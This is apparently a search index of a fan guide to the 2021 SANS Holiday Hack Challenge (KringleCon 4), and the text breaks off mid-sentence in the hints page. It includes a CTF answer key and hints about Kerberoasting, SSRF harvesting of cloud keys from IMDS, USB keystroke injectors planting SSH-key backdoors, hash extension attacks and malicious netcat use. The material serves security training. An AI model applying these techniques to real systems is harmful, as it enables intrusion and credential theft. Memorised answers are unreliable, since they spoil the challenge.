{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"KringleCon 4: Calling Birds! \u00b6 By Mo Sharif This year's KringleCon conference was full of exciting challenges and amazing talks. This guide will walk you through the objectives and terminal challenges for this conference. Here are the objectives and terminal challenges in this year's KringleCon: Objectives Objective Number Objective Name Difficulty ELF Location 1 KringleCon Orientation \u2155 Jingle Ringford North Pole/Orientation 2 Where in the World is Caramel Santaigo? \u2155 Tangle Coalbox KringleCon/Courtyard 3 Thaw Frost Tower's Entrance \u2156 Grimy McTrollkins North Pole 4 Slot Machine Investigation \u2156 FrostFest/Frost Tower Lobby 5 Strange USB Device \u2156 Morcel Nougat KringleCon/Speaker UNPreparedness Room 6 Shellcode Primer \u2157 Ruby Cyster FrostFest/Jack's Office 7 Printer Exploitation \u2158 FrostFest/Jack's Office 8 Kerberoasting on an Open Fire 5/5 9 Splunk! \u2157 Angel Candysalt KringleCon/Great Room 10 Now Hiring! \u2157 11 Customer Complaint Analysis \u2156 12 Frost Tower Website Checkup 5/5 Ingreta Tude FrostFest/Jack's Studio 13 FPGA Programming \u2158 Crunchy Squishter FrostFest/Frost Tower Rooftop Terminals Terminal Number Terminal Name ELF Location 1 Cranberry Pi Terminal Jingle Ringford North Pole/Orientation 2 Exif Metadata Piney Sappington KringleCon/Courtyard 3 Grepping for Gold Greasy GopherGuts North Pole 4 Logic Muchers Noel Boetie North Pole/ Outside Santa's Castle 5 IPv6 Sandbox Jewel Loggins KringleCon/Talks Lobby 6 Holiday Hero Chimney Scissorsticks KringleCon/Netwars 7 Shellcode Primer Ruby Cyster FrostFest/Jack's Office 8 HoHo \u2026 No Eve Snowshoes KringleCon/Santa's Office 9 Yara Analysis Fitzy Shortstack KringleCon/Entry 10 IMDS Exploration Noxious O. D'or FrostFest/Jack's Executive Restroom 11 Strace Ltrace Retrace Tinsel Upatree KringleCon/Kitchen 12 Elf Code Python Ribb Bonbowford KringleCon/Dining Room 13 Frostavator Gordy Goiterson FrostFest/Frost Tower Lobby 14 Bonus! Blue Log4Jack Bow Ninecandle North Pole 15 Bonus! Red Log4Jack Icky McGoop North Pole","title":"Home"},{"location":"#kringlecon-4-calling-birds","text":"By Mo Sharif This year's KringleCon conference was full of exciting challenges and amazing talks. This guide will walk you through the objectives and terminal challenges for this conference. Here are the objectives and terminal challenges in this year's KringleCon: Objectives Objective Number Objective Name Difficulty ELF Location 1 KringleCon Orientation \u2155 Jingle Ringford North Pole/Orientation 2 Where in the World is Caramel Santaigo? \u2155 Tangle Coalbox KringleCon/Courtyard 3 Thaw Frost Tower's Entrance \u2156 Grimy McTrollkins North Pole 4 Slot Machine Investigation \u2156 FrostFest/Frost Tower Lobby 5 Strange USB Device \u2156 Morcel Nougat KringleCon/Speaker UNPreparedness Room 6 Shellcode Primer \u2157 Ruby Cyster FrostFest/Jack's Office 7 Printer Exploitation \u2158 FrostFest/Jack's Office 8 Kerberoasting on an Open Fire 5/5 9 Splunk! \u2157 Angel Candysalt KringleCon/Great Room 10 Now Hiring! \u2157 11 Customer Complaint Analysis \u2156 12 Frost Tower Website Checkup 5/5 Ingreta Tude FrostFest/Jack's Studio 13 FPGA Programming \u2158 Crunchy Squishter FrostFest/Frost Tower Rooftop Terminals Terminal Number Terminal Name ELF Location 1 Cranberry Pi Terminal Jingle Ringford North Pole/Orientation 2 Exif Metadata Piney Sappington KringleCon/Courtyard 3 Grepping for Gold Greasy GopherGuts North Pole 4 Logic Muchers Noel Boetie North Pole/ Outside Santa's Castle 5 IPv6 Sandbox Jewel Loggins KringleCon/Talks Lobby 6 Holiday Hero Chimney Scissorsticks KringleCon/Netwars 7 Shellcode Primer Ruby Cyster FrostFest/Jack's Office 8 HoHo \u2026 No Eve Snowshoes KringleCon/Santa's Office 9 Yara Analysis Fitzy Shortstack KringleCon/Entry 10 IMDS Exploration Noxious O. D'or FrostFest/Jack's Executive Restroom 11 Strace Ltrace Retrace Tinsel Upatree KringleCon/Kitchen 12 Elf Code Python Ribb Bonbowford KringleCon/Dining Room 13 Frostavator Gordy Goiterson FrostFest/Frost Tower Lobby 14 Bonus! Blue Log4Jack Bow Ninecandle North Pole 15 Bonus! Red Log4Jack Icky McGoop North Pole","title":"KringleCon 4: Calling Birds!"},{"location":"answers/","text":"Answers \u00b6 Here are the answers to this year's KringleCon: Objective 1 \u00b6 Answer - Objective 1a) Talk to Jingle Ringford Left click on Jingle Ringford when you enter the game. Answer - Objective 1b) Get your badge Jingle Ringford will give you a badge if you keep talking to them. Answer - Objective 1c) Get the wifi adapter After talking to Jingle Ringford, a wifi adapter appears on the ground. Left click on the adapter to pick it up. Answer - Objective 1d) Use the terminal After you pickup the wifi adapter, talk to Jingle Ringford. Click on the terminal that appears. Type in answer in the terminal. Objective 2 \u00b6 Answer Eve Snowshoes in Prague, Czech Republic. Objective 3 \u00b6 Answer In the wifi adapter type the following: iwconfig wlan0 essid FROST-Nidus-Setup curl -XPOST -H 'Content-Type: application/json' --data-binary '{ \"temperature\": 20, \"humidity\": 0, \"wind\":0, \"windchill\": 0}' http://nidus-setup:8080/api/cooler Objective 4 \u00b6 Answer I'm going to have some bouncer trolls bounce you right out of this casino! Objective 5 \u00b6 Answer ickymcgoop Objective 6 \u00b6 Answer cyber security knowledge Objective 7 \u00b6 Answer Troll_Pay_Chart.xlsx Objective 8 \u00b6 Answer Kindness Objective 9 \u00b6 Answer whiz Objective 10 \u00b6 Answer CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX Objective 11 \u00b6 Answer Flud Hagg Yaqh Objective 12 \u00b6 Answer clerk Objective 13 \u00b6 Answer // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! `timescale 1ns/1ns module tone_generator ( input clk, input rst, input [31:0] freq, output wave_out ); // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ---- // TODO: Add your code below. // Remove the following line and add your own implementation. // Note: It's silly, but it compiles... reg wavey; assign wave_out = wavey; real counter; real increment = 125000000 / (freq*2/100); always @(edge clk or negedge rst) begin if (rst==1) begin counter <=0.5; wavey <=0; end else begin if(counter >= increment) begin counter <= 0; wavey <= wavey ^ 1'b1; end else counter <= counter + 0.5; end end endmodule","title":"Answers"},{"location":"answers/#answers","text":"Here are the answers to this year's KringleCon:","title":"Answers"},{"location":"answers/#objective-1","text":"Answer - Objective 1a) Talk to Jingle Ringford Left click on Jingle Ringford when you enter the game. Answer - Objective 1b) Get your badge Jingle Ringford will give you a badge if you keep talking to them. Answer - Objective 1c) Get the wifi adapter After talking to Jingle Ringford, a wifi adapter appears on the ground. Left click on the adapter to pick it up. Answer - Objective 1d) Use the terminal After you pickup the wifi adapter, talk to Jingle Ringford. Click on the terminal that appears. Type in answer in the terminal.","title":"Objective 1"},{"location":"answers/#objective-2","text":"Answer Eve Snowshoes in Prague, Czech Republic.","title":"Objective 2"},{"location":"answers/#objective-3","text":"Answer In the wifi adapter type the following: iwconfig wlan0 essid FROST-Nidus-Setup curl -XPOST -H 'Content-Type: application/json' --data-binary '{ \"temperature\": 20, \"humidity\": 0, \"wind\":0, \"windchill\": 0}' http://nidus-setup:8080/api/cooler","title":"Objective 3"},{"location":"answers/#objective-4","text":"Answer I'm going to have some bouncer trolls bounce you right out of this casino!","title":"Objective 4"},{"location":"answers/#objective-5","text":"Answer ickymcgoop","title":"Objective 5"},{"location":"answers/#objective-6","text":"Answer cyber security knowledge","title":"Objective 6"},{"location":"answers/#objective-7","text":"Answer Troll_Pay_Chart.xlsx","title":"Objective 7"},{"location":"answers/#objective-8","text":"Answer Kindness","title":"Objective 8"},{"location":"answers/#objective-9","text":"Answer whiz","title":"Objective 9"},{"location":"answers/#objective-10","text":"Answer CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX","title":"Objective 10"},{"location":"answers/#objective-11","text":"Answer Flud Hagg Yaqh","title":"Objective 11"},{"location":"answers/#objective-12","text":"Answer clerk","title":"Objective 12"},{"location":"answers/#objective-13","text":"Answer // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! `timescale 1ns/1ns module tone_generator ( input clk, input rst, input [31:0] freq, output wave_out ); // ---- DO NOT CHANGE THE CODE ABOVE THIS LINE ---- // ---- IT IS NECESSARY FOR AUTOMATED ANALYSIS ---- // TODO: Add your code below. // Remove the following line and add your own implementation. // Note: It's silly, but it compiles... reg wavey; assign wave_out = wavey; real counter; real increment = 125000000 / (freq*2/100); always @(edge clk or negedge rst) begin if (rst==1) begin counter <=0.5; wavey <=0; end else begin if(counter >= increment) begin counter <= 0; wavey <= wavey ^ 1'b1; end else counter <= counter + 0.5; end end endmodule","title":"Objective 13"},{"location":"booths/","text":"Booths \u00b6 Here are the fives booths in Kringlecon 4 which are located in Santa's Courtyard: Google SANS.edu splunk> RSAConference SWAG Google Booth Google is a proud sponsor of KringleCon and the Holiday Hack Challenge. We wish you a happy holiday hacking season. Meet Security Engineers at Google SANS.edu Booth Happy holidays from the best college in cybersecurity! Interested in attending? Here's a code to waive your application fee to SANS.edu , the best college in cybersecurity. Use the code SantaGoesToCollege when you apply. Splunk Booth Splunk is proud to be a contributor to KringleCon and the Holiday Hack Challenge. Happy Holidays from the Splunk security team! RSAC Booth Happy Holidays! Join us February 7-10 for the new RSAC 2022. Click to learn more about our program. SWAG SWAG","title":"Booths"},{"location":"booths/#booths","text":"Here are the fives booths in Kringlecon 4 which are located in Santa's Courtyard: Google SANS.edu splunk> RSAConference SWAG Google Booth Google is a proud sponsor of KringleCon and the Holiday Hack Challenge. We wish you a happy holiday hacking season. Meet Security Engineers at Google SANS.edu Booth Happy holidays from the best college in cybersecurity! Interested in attending? Here's a code to waive your application fee to SANS.edu , the best college in cybersecurity. Use the code SantaGoesToCollege when you apply. Splunk Booth Splunk is proud to be a contributor to KringleCon and the Holiday Hack Challenge. Happy Holidays from the Splunk security team! RSAC Booth Happy Holidays! Join us February 7-10 for the new RSAC 2022. Click to learn more about our program. SWAG SWAG","title":"Booths"},{"location":"credits/","text":"Credits \u00b6 SANS Holiday Hack Challenge 2021 Jack's Back! Direction Ed Skoudis Technical Lead Joshua Wright Narrative / Story Ed Skoudis & Chris Elgee World Builder Evan Booth World Wrangler Jared Folkins Programming Evan Booth Ron Bowes Chris Davis Chris Elgee Jared Folkins Tom F. Liston Joshua Wright System Builds & Administration Jared Folkins Artwork Evan Booth Patrick Chapman Chris Davis Marc Dostie Chris Elgee Chris Fleener Annie Royal Voice Artists Siana Collins Christy Elgee Ed Skoudis Challenge Development Evan Booth Ron Bowes Drew Church Chris Davis Chris Elgee Doug Erkkila Dave Herrald Tom Hessman Marcus Laferrera Josh Levine Tom Liston Clay Moody Ed Skoudis Andy Smith Marcus Stewart Audra Streetman Kevin Tyers Joshua Wright Soundtrack Chris Elgee & Kendra Pendolino Mary Ellen Kennel Ninjula Ed Skoudis Josh Skoudis Website Design Marc Dostie Tom Hessman Conference Scheduler and Speaker Wrangler Jennifer Santiago Discord Coordinator Marcus Stewart Swag Designer and Implementer Jeremy Kulikowski Testing and Feedback Tad Bennett Ron Bowes Sanjay Choudhary Mike Dopheide Chris Elgee Jared Folkins Vlad Grigorescu Tom Hessman Jeremy Kulikowski Sam Oehlert Daniel Pendolino Jerry Salinas Lynn Schifano Ed Skoudis Marcus Stewart Ryan Williams Joshua Wright Conference Speakers Sean Atkinson Jay Beale Jason Blanchard Chris Davis Chris Elgee Nancy Garich\u00e9 Bjarki \u00c1g\u00fast Gu\u00f0mundsson Mary Ellen Kennel Tom Liston Clay Moody Xena Olsen Qwerty Petabyte Ed Skoudis Andy Smith Kevin Tyers Marketing Joel Anker Darren Beare Patrick Chapman Marc Dostie Michelle Petersen Platinum Sponsor Google Extra Special Thank You To.... The SANS Institute \u00a9 Copyright SANS Institute, 2021. All Rights Reserved.","title":"Credits"},{"location":"credits/#credits","text":"SANS Holiday Hack Challenge 2021 Jack's Back! Direction Ed Skoudis Technical Lead Joshua Wright Narrative / Story Ed Skoudis & Chris Elgee World Builder Evan Booth World Wrangler Jared Folkins Programming Evan Booth Ron Bowes Chris Davis Chris Elgee Jared Folkins Tom F. Liston Joshua Wright System Builds & Administration Jared Folkins Artwork Evan Booth Patrick Chapman Chris Davis Marc Dostie Chris Elgee Chris Fleener Annie Royal Voice Artists Siana Collins Christy Elgee Ed Skoudis Challenge Development Evan Booth Ron Bowes Drew Church Chris Davis Chris Elgee Doug Erkkila Dave Herrald Tom Hessman Marcus Laferrera Josh Levine Tom Liston Clay Moody Ed Skoudis Andy Smith Marcus Stewart Audra Streetman Kevin Tyers Joshua Wright Soundtrack Chris Elgee & Kendra Pendolino Mary Ellen Kennel Ninjula Ed Skoudis Josh Skoudis Website Design Marc Dostie Tom Hessman Conference Scheduler and Speaker Wrangler Jennifer Santiago Discord Coordinator Marcus Stewart Swag Designer and Implementer Jeremy Kulikowski Testing and Feedback Tad Bennett Ron Bowes Sanjay Choudhary Mike Dopheide Chris Elgee Jared Folkins Vlad Grigorescu Tom Hessman Jeremy Kulikowski Sam Oehlert Daniel Pendolino Jerry Salinas Lynn Schifano Ed Skoudis Marcus Stewart Ryan Williams Joshua Wright Conference Speakers Sean Atkinson Jay Beale Jason Blanchard Chris Davis Chris Elgee Nancy Garich\u00e9 Bjarki \u00c1g\u00fast Gu\u00f0mundsson Mary Ellen Kennel Tom Liston Clay Moody Xena Olsen Qwerty Petabyte Ed Skoudis Andy Smith Kevin Tyers Marketing Joel Anker Darren Beare Patrick Chapman Marc Dostie Michelle Petersen Platinum Sponsor Google Extra Special Thank You To.... The SANS Institute \u00a9 Copyright SANS Institute, 2021. All Rights Reserved.","title":"Credits"},{"location":"items/","text":"Items \u00b6 This page outlines where to find the items in the game. These items are used in different objectives and challenges. WiFi Dongle FPGA WiFi Dongle Location : The North Pole > Orientation Elf : Talk to Jingle Ringford to receive this item. Objective : Solve Objective 1c to get this item. Usage : This item is used for solving objective 3. FPGA Location : FrostFest > Frost Tower Rooftop Objective : Solve Objective 13 to get this item. Usage : Plug the FPGA into Speak 8c Spell next to Crunchy Squishter.","title":"Items"},{"location":"items/#items","text":"This page outlines where to find the items in the game. These items are used in different objectives and challenges. WiFi Dongle FPGA WiFi Dongle Location : The North Pole > Orientation Elf : Talk to Jingle Ringford to receive this item. Objective : Solve Objective 1c to get this item. Usage : This item is used for solving objective 3. FPGA Location : FrostFest > Frost Tower Rooftop Objective : Solve Objective 13 to get this item. Usage : Plug the FPGA into Speak 8c Spell next to Crunchy Squishter.","title":"Items"},{"location":"map/","text":"Map/destinations \u00b6 Here are the destinations available in KringoleCon 4.","title":"Map"},{"location":"map/#mapdestinations","text":"Here are the destinations available in KringoleCon 4.","title":"Map/destinations"},{"location":"music/","text":"Music \u00b6 The music tracks for KringoleCon 4 can be downloaded below: I Love Winter by Josh Skoudis Viva Frost Vegas - Ninjula All Your Christmas Are Belong to Us - Ninjula 1999 + In the Hall of the Mountain King - Ninjula Goody Two Shoes - Josh Skoudis & Ninjula Do You Hear What I Hear - Ninjula I'd Prefer a Semi-Aquatic Mamal for Christmas - Ninjula Wyatt Kristmas - Ninjula Santaman - Chris Elgee Kendra Pendolino Chill, You Cherry Old Chaps - Ninjula","title":"Music"},{"location":"music/#music","text":"The music tracks for KringoleCon 4 can be downloaded below: I Love Winter by Josh Skoudis Viva Frost Vegas - Ninjula All Your Christmas Are Belong to Us - Ninjula 1999 + In the Hall of the Mountain King - Ninjula Goody Two Shoes - Josh Skoudis & Ninjula Do You Hear What I Hear - Ninjula I'd Prefer a Semi-Aquatic Mamal for Christmas - Ninjula Wyatt Kristmas - Ninjula Santaman - Chris Elgee Kendra Pendolino Chill, You Cherry Old Chaps - Ninjula","title":"Music"},{"location":"narrative/","text":"KringleCon Narrative \u00b6 The KringleCon narrative is the game's storyline. The narrative progresses as different objectives are solved. The full narrative can be viewed once all the objectives have been completed. The Narrative \u00b6 Listen children to a story that was written in the cold 'Bout a Kringle and his castle hosting hackers, meek and bold Then from somewhere came another, built his tower tall and proud Surely he, our Frosty villain hides intentions 'neath a shroud So begins Jack's reckless mission: gather trolls to win a war Build a con that's fresh and shiny, has this yet been done before? Is his Fest more feint than folly? Some have noticed subtle clues Running 'round and raiding repos, stealing Santa's Don'ts and Do's Misdirected, scheming, grasping, Frost intends to seize the day Funding research with a gift shop, can Frost build the better sleigh? Lo, we find unlikely allies: trolls within Jack's own command Doubting Frost and searching motive, questioning his dark demand Is our Jack just lost and rotten - one more outlaw stomping toes? Why then must we piece together cludgy, wacky radios? With this object from the heavens, Frost must know his cover's blown Hearkening from distant planet! We the heroes should have known Go ahead and hack your neighbor, go ahead and phish a friend Do it in the name of holidays, you can justify it at year's end There won't be any retweets praising you, come disclosure day But on the snowy evening after? Still Kris Kringle rides the sleigh","title":"Narrative"},{"location":"narrative/#kringlecon-narrative","text":"The KringleCon narrative is the game's storyline. The narrative progresses as different objectives are solved. The full narrative can be viewed once all the objectives have been completed.","title":"KringleCon Narrative"},{"location":"narrative/#the-narrative","text":"Listen children to a story that was written in the cold 'Bout a Kringle and his castle hosting hackers, meek and bold Then from somewhere came another, built his tower tall and proud Surely he, our Frosty villain hides intentions 'neath a shroud So begins Jack's reckless mission: gather trolls to win a war Build a con that's fresh and shiny, has this yet been done before? Is his Fest more feint than folly? Some have noticed subtle clues Running 'round and raiding repos, stealing Santa's Don'ts and Do's Misdirected, scheming, grasping, Frost intends to seize the day Funding research with a gift shop, can Frost build the better sleigh? Lo, we find unlikely allies: trolls within Jack's own command Doubting Frost and searching motive, questioning his dark demand Is our Jack just lost and rotten - one more outlaw stomping toes? Why then must we piece together cludgy, wacky radios? With this object from the heavens, Frost must know his cover's blown Hearkening from distant planet! We the heroes should have known Go ahead and hack your neighbor, go ahead and phish a friend Do it in the name of holidays, you can justify it at year's end There won't be any retweets praising you, come disclosure day But on the snowy evening after? Still Kris Kringle rides the sleigh","title":"The Narrative"},{"location":"ohints/","text":"Hints \u00b6 This page will provide various hints that were provided by the game for objectives challenges. Objective Hints \u00b6 Objectives 1 2 3 4 5 6 7 8 9 10 11 12 13 No hints. Hint 1 Link a talk : Link Hint 2 Link decoded and read : Link Hint3 Link MGRS : Link what3words : Link Hint 1 Link POST request with data : Link Hint 2 Link cURL : Link Hint 3 Links iwlist : Link iwconfig : Link Greasy GopherGuts's Hint You really did it? Well, OK then. Here's what I know about the wifi here. Scanning for Wi-Fi networks with iwlist will be location-dependent. You may need to move around the North Pole and keep scanning to identify a Wi-Fi network. Wireless in Linux is supported by many tools, but iwlist and iwconfig are commonly used at the command line. The curl utility can make HTTP requests at the command line! By default, curl makes an HTTP GET request. You can add --request POST as a command line argument to make an HTTP POST request. When sending HTTP POST, add --data-binary followed by the data you want to send as the POST body. Hint 1 Link parameter tampering : Link Hint 2 Links Burp Suite : Link Edit and Resent : Link Noel Boetie's Hint Wow - amazing score! Great work! So hey, those slot machines. It seems that in his haste, Jack bought some terrible hardware. It seems they're susceptible to parameter tampering parameter tampering . You can modify web request parameters with an intercepting proxy or tools built into Firefox. Hint 1 Link MITRE ATT&CK(TM) tactic T1098.004 : Link Hint 2 Link Mallard : Link Hint 3 Links duck encoder : Link Hint 4 Links Ducky Script : Link Jewel Loggins's Hint Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful? Chimney Scissorsticks's Hint Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful? Hint 1 Link https://printer.kringlecastle.com/incoming/ : Link Hint 2 Link Hash Extension Attacks : Link Ruby Cyster's Hint Oh man - what is this all about? Great work though. So first things first, you should definitely take a look at the firmware. With that in-hand, you can pick it apart and see what's there. Did you know that if you append multiple files of that type, the last one is processed? Have you heard of Hash Extension Attacks? If something isn't working, be sure to check the output! The error messages are very verbose. Everything else accomplished, you just might be able to get shell access to that dusty old thing! Hint 1 Link Bloodhound : Link native : Link methods : Link Hint 3 Links CeWL : Link Hint 4 Links OneRuleToRuleThemAll.rule : Link Hint 6 Links Kerberoasting : Link Hint 7 Links Chris Davis' talk : Link and scripts : Link Eve Snowshoes's Hint Fantastic! Thanks for the help! Hey, would you like to know more about Kerberoasting and Active Directory permissions abuse? There's a great talk by Chris Davis on this exact subject! There are also plenty of resources available to learn more about Kerberoasting specifically. If you have any trouble finding the domain controller on the 10.X.X.X network, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443. Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace. Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website, but it will ignore digits in terms by default. So, apropos of nothing, have you ever known system administrators who store credentials in scripts? I know, I know, you understand the folly and would never do it! The easy way to investigate Active Directory misconfigurations (for Blue and Red alike!) is with Bloodhound , but there are native methods as well. Oh, and one last thing: once you've granted permissions to your user, it might take up to five minutes for it to propogate throughout the domain. Fitzy Shortstack's Hint Thanks - you figured it out! Let me tell you what I know about Splunk. Did you know Splunk recently added support for new data sources including Sysmon for Linux and GitHub Audit Log data? Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add, git status, and git commit. You can also see cloned GitHub projects. There's a lot of interesting stuff out there. Did you know there are repositories of code that are Darn Vulnerable? Sysmon provides a lot of valuable data, but sometimes correlation across data types is still necessary. Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Sometimes Sysmon data collection is awkward. Pipelining multiple commands generates multiple Sysmon events, for example. Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd, for example. Hint 1 Link AWS Documentation for IMDS : Link Noxious O. D'or's Hint Phew! That is something extra! Oh, and you solved the challenge too? Great! Cloud assets are interesting targets for attackers. Did you know they automatically get IMDS access? I'm very concerned about the combination of SSRF and IMDS access. Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks? Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" With an SSRF attack, we can make the server request a URL. This can reveal valuable data! The AWS documentation for IMDS is interesting reading. Hint 1 Link display filters : Link Hint 1 Link RFC3514 : Link Noxious O. D'or's Hint Great! Thanks so much for your help! I'm sure I can put those skills I just learned from you to good use. Are you familiar with RFC3514 ? Wireshark uses a different name for the Evil Bit: ip.flags.rb. HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword. Hint 1 Link tremendously : Link valuable : Link Ribb Bonbowford's Hint Gosh, with skills like that, I'll bet you could help figure out what's really going on next door... And, as I promised, let me tell you what I know about SQL injection. I hear that having source code for vulnerability discovery dramatically changes the vulnerability discovery process. I imagine it changes how you approach an assessment too. When you have the source code, API documentation becomes tremendously valuable . Who knows? Maybe you'll even find more than one vulnerability in the code. Hint 1 Link FPGA enthusiast sites : Link a lesson : Link Grody Golterson's Hint Oooo... That's it! A deal's a deal. Let's talk FPGA. First, did you know there are people who do this stuff for fun ?? I mean, I'm more into picking on other trolls for fun, but whatever. Also, that Prof. Petabyte guy is giving a talk about FPGAs. Weirdo. So hey, good luck or whatever.","title":"Objectives"},{"location":"ohints/#hints","text":"This page will provide various hints that were provided by the game for objectives challenges.","title":"Hints"},{"location":"ohints/#objective-hints","text":"Objectives 1 2 3 4 5 6 7 8 9 10 11 12 13 No hints. Hint 1 Link a talk : Link Hint 2 Link decoded and read : Link Hint3 Link MGRS : Link what3words : Link Hint 1 Link POST request with data : Link Hint 2 Link cURL : Link Hint 3 Links iwlist : Link iwconfig : Link Greasy GopherGuts's Hint You really did it? Well, OK then. Here's what I know about the wifi here. Scanning for Wi-Fi networks with iwlist will be location-dependent. You may need to move around the North Pole and keep scanning to identify a Wi-Fi network. Wireless in Linux is supported by many tools, but iwlist and iwconfig are commonly used at the command line. The curl utility can make HTTP requests at the command line! By default, curl makes an HTTP GET request. You can add --request POST as a command line argument to make an HTTP POST request. When sending HTTP POST, add --data-binary followed by the data you want to send as the POST body. Hint 1 Link parameter tampering : Link Hint 2 Links Burp Suite : Link Edit and Resent : Link Noel Boetie's Hint Wow - amazing score! Great work! So hey, those slot machines. It seems that in his haste, Jack bought some terrible hardware. It seems they're susceptible to parameter tampering parameter tampering . You can modify web request parameters with an intercepting proxy or tools built into Firefox. Hint 1 Link MITRE ATT&CK(TM) tactic T1098.004 : Link Hint 2 Link Mallard : Link Hint 3 Links duck encoder : Link Hint 4 Links Ducky Script : Link Jewel Loggins's Hint Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful? Chimney Scissorsticks's Hint Great work! It seems simpler now that I've seen it once. Thanks for showing me! Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors! A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in. Ducky Script is a language used to specify those keystrokes. What commands would a troll try to run on our workstations? I heard that SSH keys can be used as backdoors . Maybe that's useful? Hint 1 Link https://printer.kringlecastle.com/incoming/ : Link Hint 2 Link Hash Extension Attacks : Link Ruby Cyster's Hint Oh man - what is this all about? Great work though. So first things first, you should definitely take a look at the firmware. With that in-hand, you can pick it apart and see what's there. Did you know that if you append multiple files of that type, the last one is processed? Have you heard of Hash Extension Attacks? If something isn't working, be sure to check the output! The error messages are very verbose. Everything else accomplished, you just might be able to get shell access to that dusty old thing! Hint 1 Link Bloodhound : Link native : Link methods : Link Hint 3 Links CeWL : Link Hint 4 Links OneRuleToRuleThemAll.rule : Link Hint 6 Links Kerberoasting : Link Hint 7 Links Chris Davis' talk : Link and scripts : Link Eve Snowshoes's Hint Fantastic! Thanks for the help! Hey, would you like to know more about Kerberoasting and Active Directory permissions abuse? There's a great talk by Chris Davis on this exact subject! There are also plenty of resources available to learn more about Kerberoasting specifically. If you have any trouble finding the domain controller on the 10.X.X.X network, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443. Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace. Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website, but it will ignore digits in terms by default. So, apropos of nothing, have you ever known system administrators who store credentials in scripts? I know, I know, you understand the folly and would never do it! The easy way to investigate Active Directory misconfigurations (for Blue and Red alike!) is with Bloodhound , but there are native methods as well. Oh, and one last thing: once you've granted permissions to your user, it might take up to five minutes for it to propogate throughout the domain. Fitzy Shortstack's Hint Thanks - you figured it out! Let me tell you what I know about Splunk. Did you know Splunk recently added support for new data sources including Sysmon for Linux and GitHub Audit Log data? Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add, git status, and git commit. You can also see cloned GitHub projects. There's a lot of interesting stuff out there. Did you know there are repositories of code that are Darn Vulnerable? Sysmon provides a lot of valuable data, but sometimes correlation across data types is still necessary. Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Sometimes Sysmon data collection is awkward. Pipelining multiple commands generates multiple Sysmon events, for example. Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd, for example. Hint 1 Link AWS Documentation for IMDS : Link Noxious O. D'or's Hint Phew! That is something extra! Oh, and you solved the challenge too? Great! Cloud assets are interesting targets for attackers. Did you know they automatically get IMDS access? I'm very concerned about the combination of SSRF and IMDS access. Did you know it's possible to harvest cloud keys through SSRF and IMDS attacks? Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" With an SSRF attack, we can make the server request a URL. This can reveal valuable data! The AWS documentation for IMDS is interesting reading. Hint 1 Link display filters : Link Hint 1 Link RFC3514 : Link Noxious O. D'or's Hint Great! Thanks so much for your help! I'm sure I can put those skills I just learned from you to good use. Are you familiar with RFC3514 ? Wireshark uses a different name for the Evil Bit: ip.flags.rb. HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword. Hint 1 Link tremendously : Link valuable : Link Ribb Bonbowford's Hint Gosh, with skills like that, I'll bet you could help figure out what's really going on next door... And, as I promised, let me tell you what I know about SQL injection. I hear that having source code for vulnerability 